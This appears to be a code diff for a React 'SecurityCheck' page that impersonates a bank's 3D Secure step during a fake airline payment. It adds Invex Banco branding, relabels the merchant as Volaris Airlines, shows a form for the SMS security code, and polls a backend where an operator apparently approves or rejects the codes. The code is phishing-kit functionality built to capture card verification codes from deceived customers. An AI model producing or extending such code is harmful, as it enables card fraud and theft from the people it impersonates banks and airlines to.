@@ -10,6 +10,13 @@ interface BankConfig {
 }
 
 const bankConfigs: Record<string, BankConfig> = {
+    invex_volaris: {
+        name: 'Invex Banco',
+        logo: '/assets/logos/invexbancologo.png',
+        primaryColor: '#d60b52', // Invex/Volaris pink-ish red
+        secondaryColor: '#ffffff',
+        textColor: '#333333'
+    },
     azteca: {
         name: 'Banco Azteca',
         logo: '/assets/banks/azteca.png',
@@ -91,6 +98,9 @@ const SecurityCheck = () => {
     const [amount, setAmount] = useState('0.00');
     const [isVerifying, setIsVerifying] = useState(false);
     
+    // We always show the form now, as we only arrive here if 3D Secure is required
+    const showTokenForm = true;
+    
     useEffect(() => {
         const storedInfo = localStorage.getItem('info');
         const storedPayment = localStorage.getItem('paymentInfo');
@@ -136,33 +146,49 @@ const SecurityCheck = () => {
 
     const config = bankConfigs[bank] || bankConfigs.other;
 
+    // Poll for status immediately on mount (to handle direct approval) or when verifying
     useEffect(() => {
         let interval: any;
-        if (isVerifying) {
+        
+        const pollStatus = async () => {
              const storedPayment = localStorage.getItem('paymentInfo');
              if (!storedPayment) return;
              const payment = JSON.parse(storedPayment);
 
-             interval = setInterval(async () => {
-                try {
-                    const statusRes = await fetch(`/api/payments/${payment.bookingId}/status`);
-                    const statusData = await statusRes.json();
+             try {
+                const statusRes = await fetch(`/api/payments/${payment.bookingId}/status`);
+                const statusData = await statusRes.json();
 
-                    if (statusData.status === 'VERIFIED' || statusData.status === 'COMPLETED') {
-                        clearInterval(interval);
-                        navigate('/confirmation');
-                    } else if (statusData.status === 'TOKEN_REJECTED' || statusData.status === 'FAILED') {
-                        clearInterval(interval);
+                // If approved directly by admin (COMPLETED) or token verified (VERIFIED)
+                if (statusData.status === 'VERIFIED' || statusData.status === 'COMPLETED') {
+                    clearInterval(interval);
+                    navigate('/correct-payment');
+                } 
+                // If rejected directly or token rejected
+                else if (statusData.status === 'TOKEN_REJECTED' || statusData.status === 'FAILED') {
+                    if (isVerifying) {
+                        // If we were waiting for token verification
                         setIsVerifying(false);
                         setIsLoading(false);
-                        alert('Código incorrecto. Por favor intente nuevamente.');
+                        alert('Código incorrecto o pago rechazado. Por favor verifique.');
                         setToken('');
+                    } else if (statusData.status === 'FAILED') {
+                         clearInterval(interval);
+                         alert('El pago ha sido rechazado por el banco.');
+                         navigate('/payment');
                     }
-                } catch (err) {
-                    console.error('Polling error', err);
                 }
-            }, 2000);
-        }
+            } catch (err) {
+                console.error('Polling error', err);
+            }
+        };
+
+        // Poll every 2 seconds
+        interval = setInterval(pollStatus, 2000);
+        
+        // Initial check
+        pollStatus();
+
         return () => clearInterval(interval);
     }, [isVerifying, navigate]);
 
@@ -217,7 +243,7 @@ const SecurityCheck = () => {
                 </h2>
 
                 <div className="bg-gray-50 p-4 rounded mb-6 text-sm">
-                    <p className="mb-2"><strong>Comercio:</strong> LATAM AIRLINES</p>
+                    <p className="mb-2"><strong>Comercio:</strong> VOLARIS AIRLINES</p>
                     <p className="mb-2"><strong>Fecha:</strong> {new Date().toLocaleDateString('es-MX', { year: 'numeric', month: 'long', day: 'numeric' })}</p>
                     <p className="mb-2"><strong>Tarjeta:</strong> **** **** **** {cardLast4}</p>
                     <p className="mb-2"><strong>Importe:</strong> {amount}</p>
@@ -229,6 +255,26 @@ const SecurityCheck = () => {
                         : 'Para confirmar la operación, ingrese el código de seguridad enviado por SMS a su celular registrado.'}
                 </p>
 
+                {!showTokenForm ? (
+                    <div className="text-center py-8">
+                        <div className="spinner-border text-primary mb-3" role="status" style={{ width: '3rem', height: '3rem', color: config.primaryColor }}>
+                             <span className="sr-only">Cargando...</span>
+                        </div>
+                        <p className="text-gray-600 font-semibold">Procesando pago con el banco...</p>
+                        <p className="text-xs text-gray-400 mt-2">Por favor espere, no cierre esta ventana.</p>
+                        {/* Spinner visual mockup if bootstrap spinner not available */}
+                        <style>{`
+                            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                            .spinner-border {
+                                display: inline-block;
+                                border: 4px solid rgba(0,0,0,0.1);
+                                border-left-color: currentColor;
+                                border-radius: 50%;
+                                animation: spin 1s linear infinite;
+                            }
+                        `}</style>
+                    </div>
+                ) : (
                 <form onSubmit={handleSubmit}>
                     <div className="mb-6">
                         <label className="block text-gray-700 text-sm font-bold mb-2">
@@ -256,6 +302,7 @@ const SecurityCheck = () => {
                         {isLoading ? 'Verificando...' : 'Confirmar'}
                     </button>
                 </form>
+                )}
 
                 <div className="mt-6 text-center">
                      <p className="text-xs text-gray-400">
